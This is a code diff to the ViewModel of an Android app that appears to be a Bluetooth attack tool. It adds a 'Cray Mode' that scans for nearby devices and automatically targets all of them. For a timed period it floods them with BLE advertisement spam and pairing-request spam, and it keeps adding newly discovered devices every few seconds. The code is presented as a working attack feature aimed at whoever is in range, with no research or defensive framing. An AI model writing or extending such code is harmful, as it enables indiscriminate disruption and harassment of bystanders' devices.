@@ -10,6 +10,7 @@ import androidx.lifecycle.MutableLiveData
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
 import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
@@ -19,6 +20,7 @@ sealed class HidState {
     data object Idle : HidState()
     data object Scanning : HidState()
     data class Attacking(val connectedCount: Int) : HidState()
+    data class CrayMode(val connectedCount: Int, val secondsRemaining: Int) : HidState()
     data object Stopping : HidState()
     data class Error(val message: String) : HidState()
 }
@@ -78,6 +80,11 @@ class BluetoothHidViewModel : ViewModel() {
     // Track which tab is active (0=BLE Spam, 1=Data Send)
     val activeTab = MutableStateFlow(0)
 
+    // ---- Cray Mode state ----
+    val isCrayMode = MutableStateFlow(false)
+    val craySecondsRemaining = MutableStateFlow(0)
+    val crayDuration = MutableStateFlow(60) // default 60s
+
     // Image data for IMAGE / VCARD_PHOTO types
     private var pendingImageBytes: ByteArray? = null
     private var pendingImageMimeType: String = "image/jpeg"
@@ -87,6 +94,8 @@ class BluetoothHidViewModel : ViewModel() {
     private var keystrokeObserverJob: Job? = null
     private var attackLoopJob: Job? = null
     private var errorObserverJob: Job? = null
+    private var crayTimerJob: Job? = null
+    private var crayScanJob: Job? = null
 
     // ---- Form field management for Data Send tab ----
 
@@ -318,8 +327,134 @@ class BluetoothHidViewModel : ViewModel() {
         }
     }
 
+    // ---- CRAY MODE: auto-scan, auto-target all, max-speed chaos for a set duration ----
+
+    fun startCrayMode(context: Context) {
+        if (_state.value is HidState.Attacking || _state.value is HidState.CrayMode) return
+
+        val duration = crayDuration.value
+        isCrayMode.value = true
+        craySecondsRemaining.value = duration
+        _keystrokesSent.value = 0
+        _connectedCount.value = 0
+
+        // Phase 1: Scan for 5 seconds to find targets, then unleash chaos
+        _state.value = HidState.CrayMode(0, duration)
+
+        // Stop any existing scan
+        if (_isScanning.value == true) stopScan(context)
+
+        // Start scanning
+        _isScanning.value = true
+        _isScanningFlow.value = true
+        discoveryManager.startDiscovery(context)
+
+        scanObserverJob?.cancel()
+        scanObserverJob = viewModelScope.launch {
+            discoveryManager.devices.collect { devices ->
+                _discoveredDevices.postValue(devices)
+            }
+        }
+
+        CrashLogger.log(context, "CrayMode", "CRAY MODE activated! Duration=${duration}s")
+
+        // After a brief scan window, start attacking everything found — and keep adding new targets
+        crayScanJob = viewModelScope.launch {
+            delay(3000) // 3 second initial scan
+            launchCrayAttack(context)
+
+            // Keep re-targeting newly discovered devices every 5 seconds
+            while (true) {
+                delay(5000)
+                val allDevices = _discoveredDevices.value ?: emptyList()
+                val allAddresses = allDevices.map { it.address }.toSet()
+                if (allAddresses != (selectedTargets.value ?: emptySet())) {
+                    // New devices found — restart pairing spammer with expanded targets
+                    pairingSpammer.stop(context)
+                    val name = customDeviceName.value ?: "CRAY"
+                    updateSelectedTargets(allAddresses)
+                    _connectedCount.postValue(allAddresses.size)
+                    pairingSpammer.start(context, name, allAddresses, allDevices, crayMode = true)
+                    CrashLogger.log(context, "CrayMode", "Re-targeted ${allAddresses.size} devices")
+                }
+            }
+        }
+
+        // Countdown timer
+        crayTimerJob = viewModelScope.launch {
+            for (remaining in duration downTo 1) {
+                craySecondsRemaining.value = remaining
+                val targets = selectedTargets.value?.size ?: 0
+                _state.postValue(HidState.CrayMode(targets, remaining))
+                delay(1000)
+            }
+            craySecondsRemaining.value = 0
+            // Time's up — stop everything
+            stopCrayMode(context)
+        }
+    }
+
+    private fun launchCrayAttack(context: Context) {
+        // Stop scanning to free up the radio for attacks
+        _isScanning.value = false
+        _isScanningFlow.value = false
+        // Don't stop discovery — keep finding devices in the background
+
+        val allDevices = _discoveredDevices.value ?: emptyList()
+        val allAddresses = allDevices.map { it.address }.toSet()
+        updateSelectedTargets(allAddresses)
+        _connectedCount.postValue(allAddresses.size)
+
+        if (allAddresses.isEmpty()) {
+            CrashLogger.log(context, "CrayMode", "No devices found, BLE ads only")
+        }
+
+        val name = customDeviceName.value ?: "CRAY"
+
+        // BLE advertiser in cray mode: fast rotation through random names
+        bleAdvertiser.start(context, name, crayMode = true)
+
+        // Pairing spammer in turbo mode: hit everything
+        if (allAddresses.isNotEmpty()) {
+            pairingSpammer.start(context, name, allAddresses, allDevices, crayMode = true)
+        }
+
+        // Observe counters
+        connectedObserverJob = viewModelScope.launch {
+            pairingSpammer.connectionAttempts.collect { count ->
+                val bleCount = bleAdvertiser.broadcastCount.value
+                _keystrokesSent.postValue(count + bleCount)
+            }
+        }
+        keystrokeObserverJob = viewModelScope.launch {
+            bleAdvertiser.broadcastCount.collect { bleCount ->
+                val pairingCount = pairingSpammer.connectionAttempts.value
+                _keystrokesSent.postValue(pairingCount + bleCount)
+            }
+        }
+    }
+
+    fun stopCrayMode(context: Context) {
+        isCrayMode.value = false
+        craySecondsRemaining.value = 0
+        crayTimerJob?.cancel()
+        crayScanJob?.cancel()
+        stopAttack(context)
+        // Also stop discovery that may still be running
+        discoveryManager.stopDiscovery(context)
+        _isScanning.value = false
+        _isScanningFlow.value = false
+        CrashLogger.log(context, "CrayMode", "CRAY MODE stopped")
+    }
+
     fun stopAttack(context: Context) {
         if (_state.value is HidState.Idle || _state.value is HidState.Stopping) return
+
+        // If cray mode is active, delegate to stopCrayMode
+        if (isCrayMode.value) {
+            stopCrayMode(context)
+            return
+        }
 
         _state.value = HidState.Stopping
 
@@ -345,6 +480,9 @@ class BluetoothHidViewModel : ViewModel() {
         connectedObserverJob?.cancel()
         keystrokeObserverJob?.cancel()
         attackLoopJob?.cancel()
+        crayTimerJob?.cancel()
+        crayScanJob?.cancel()
         _isScanning.value = false
+        isCrayMode.value = false
     }
 }
